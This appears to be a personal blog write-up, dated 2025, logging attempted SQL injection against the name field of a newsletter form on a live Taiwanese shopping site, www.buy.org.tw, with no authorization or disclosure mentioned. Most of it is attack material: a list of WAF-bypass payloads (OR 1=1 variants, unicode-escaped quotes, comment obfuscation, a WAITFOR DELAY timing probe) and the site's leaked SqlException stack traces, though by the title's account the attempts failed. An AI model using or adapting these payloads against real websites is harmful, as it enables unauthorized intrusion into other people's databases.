---
title: SQL Injection buy.org Failed
description: SQL Injection buy.org Failed
last_update:
  date: "2025-08-24T08:00:00+08:00"
---

## 前言

- 目標: https://www.buy.org.tw/Info/InfoEdmSubscribe.aspx
- 注入點: "姓名" 欄位

## 測試過程

1. `'`

```
[SqlException (0x80131904): 接近 '小姐' 之處的語法不正確。
遺漏字元字串 ')' 後面的引號。]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2567798
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5982764
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4349
   System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async, Int32 timeout, Boolean asyncWrite) +950
   System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(TaskCompletionSource`1 completion, String methodName, Boolean sendToPipe, Int32 timeout, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +301
   System.Data.SqlClient.SqlCommand.ExecuteNonQuery() +286
   IDU_Data..ctor(String _pSqlComm) +173
   ASP.info_ajaxinfo_aspx.Page_Load(Object sender, EventArgs e) +1385
   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +51
   System.Web.UI.Control.OnLoad(EventArgs e) +95
   System.Web.UI.Control.LoadRecursive() +59
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +678
```

2. WAF

```sql
' OR '1' = '1
' AND '1' = '1
' AND 'A' = 'A
' AND '
'/**/OR/**/'1'=1'
'/**/OR/**/'E'='E
'/**/or/**/'E'='E
'/**/or '陳' = '陳
'--
\u0027\u002d\u002d
'/*
' OR \u00271' = '1
\u0027 OR \u00271\u0027=\u00271
\u0027 OR \u00272\u0027>\u00271
\u0027 Or \u00272\u0027>\u00271
\u0027 OR \u0027１\u0027=\u0027１
'OR%0a'1'='1
' OR 'abc' LIKE 'a%
' OR '2' BETWEEN '1' AND '3
' OR '
' OR \u0027
' OR\u0020\u0027
' oR '
' oR\u0009\u0027ㄅ\u0027=\u0027ㄅ
" OR "1"="1
' OR TRUE--
' OR 1--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
');--
');-\u002d
'OR%09'1'='1
');IF('1'='1
```

```
Web Page Blocked!
The page cannot be displayed. Please contact the administrator for additional information.

URL: www.buy.org.tw/Info/AjaxInfo.aspx

Client IP: x.x.x.x
Attack ID: xxxxxxxx
Message ID: xxxxxxxxxxxx
```

看來有 WAF 要繞過，感覺是一場硬仗

3. 訂閱成功

```
OR
AND
```

4. `'/**/or`

```
[SqlException (0x80131904): 接近關鍵字 'or' 之處的語法不正確。
遺漏字元字串 ')' 後面的引號。]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2567798
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5982764
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4349
   System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async, Int32 timeout, Boolean asyncWrite) +950
   System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(TaskCompletionSource`1 completion, String methodName, Boolean sendToPipe, Int32 timeout, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +301
   System.Data.SqlClient.SqlCommand.ExecuteNonQuery() +286
   IDU_Data..ctor(String _pSqlComm) +173
   ASP.info_ajaxinfo_aspx.Page_Load(Object sender, EventArgs e) +1385
   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +51
   System.Web.UI.Control.OnLoad(EventArgs e) +95
   System.Web.UI.Control.LoadRecursive() +59
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +678
```

5. `' OR\u0020`

```
[SqlException (0x80131904): 接近關鍵字 'OR' 之處的語法不正確。
遺漏字元字串 ')' 後面的引號。]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2567798
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5982764
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4349
   System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async, Int32 timeout, Boolean asyncWrite) +950
   System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(TaskCompletionSource`1 completion, String methodName, Boolean sendToPipe, Int32 timeout, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +301
   System.Data.SqlClient.SqlCommand.ExecuteNonQuery() +286
   IDU_Data..ctor(String _pSqlComm) +173
   ASP.info_ajaxinfo_aspx.Page_Load(Object sender, EventArgs e) +1385
   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +51
   System.Web.UI.Control.OnLoad(EventArgs e) +95
   System.Web.UI.Control.LoadRecursive() +59
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +678
```

6. `'/**/OR/**/`

```
[SqlException (0x80131904): 接近關鍵字 'OR' 之處的語法不正確。
遺漏字元字串 ')' 後面的引號。]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2567798
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5982764
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4349
   System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async, Int32 timeout, Boolean asyncWrite) +950
   System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(TaskCompletionSource`1 completion, String methodName, Boolean sendToPipe, Int32 timeout, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +301
   System.Data.SqlClient.SqlCommand.ExecuteNonQuery() +286
   IDU_Data..ctor(String _pSqlComm) +173
   ASP.info_ajaxinfo_aspx.Page_Load(Object sender, EventArgs e) +1385
   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +51
   System.Web.UI.Control.OnLoad(EventArgs e) +95
   System.Web.UI.Control.LoadRecursive() +59
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +678
```

7. `'/**/OR/**/--`

```
[SqlException (0x80131904): 接近關鍵字 'OR' 之處的語法不正確。]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2567798
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5982764
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4349
   System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async, Int32 timeout, Boolean asyncWrite) +950
   System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(TaskCompletionSource`1 completion, String methodName, Boolean sendToPipe, Int32 timeout, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +301
   System.Data.SqlClient.SqlCommand.ExecuteNonQuery() +286
   IDU_Data..ctor(String _pSqlComm) +173
   ASP.info_ajaxinfo_aspx.Page_Load(Object sender, EventArgs e) +1385
   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +51
   System.Web.UI.Control.OnLoad(EventArgs e) +95
   System.Web.UI.Control.LoadRecursive() +59
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +678
```

8. `';`

```
[SqlException (0x80131904): 接近 ';' 之處的語法不正確。
遺漏字元字串 ')' 後面的引號。]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2567798
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5982764
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4349
   System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async, Int32 timeout, Boolean asyncWrite) +950
   System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(TaskCompletionSource`1 completion, String methodName, Boolean sendToPipe, Int32 timeout, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +301
   System.Data.SqlClient.SqlCommand.ExecuteNonQuery() +286
   IDU_Data..ctor(String _pSqlComm) +173
   ASP.info_ajaxinfo_aspx.Page_Load(Object sender, EventArgs e) +1385
   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +51
   System.Web.UI.Control.OnLoad(EventArgs e) +95
   System.Web.UI.Control.LoadRecursive() +59
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +678
```

9. `');`

```
[SqlException (0x80131904): 接近 ', ' 之處的語法不正確。
遺漏字元字串 ')' 後面的引號。]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2567798
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5982764
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4349
   System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async, Int32 timeout, Boolean asyncWrite) +950
   System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(TaskCompletionSource`1 completion, String methodName, Boolean sendToPipe, Int32 timeout, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +301
   System.Data.SqlClient.SqlCommand.ExecuteNonQuery() +286
   IDU_Data..ctor(String _pSqlComm) +173
   ASP.info_ajaxinfo_aspx.Page_Load(Object sender, EventArgs e) +1385
   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +51
   System.Web.UI.Control.OnLoad(EventArgs e) +95
   System.Web.UI.Control.LoadRecursive() +59
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +678
```

10. `'); '`

```
[SqlException (0x80131904): 接近 '' 之處的語法不正確。]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2567798
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5982764
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4349
   System.Data.SqlClient.SqlCommand.RunExecuteNonQueryTds(String methodName, Boolean async, Int32 timeout, Boolean asyncWrite) +950
   System.Data.SqlClient.SqlCommand.InternalExecuteNonQuery(TaskCompletionSource`1 completion, String methodName, Boolean sendToPipe, Int32 timeout, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +301
   System.Data.SqlClient.SqlCommand.ExecuteNonQuery() +286
   IDU_Data..ctor(String _pSqlComm) +173
   ASP.info_ajaxinfo_aspx.Page_Load(Object sender, EventArgs e) +1385
   System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) +51
   System.Web.UI.Control.OnLoad(EventArgs e) +95
   System.Web.UI.Control.LoadRecursive() +59
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +678
```
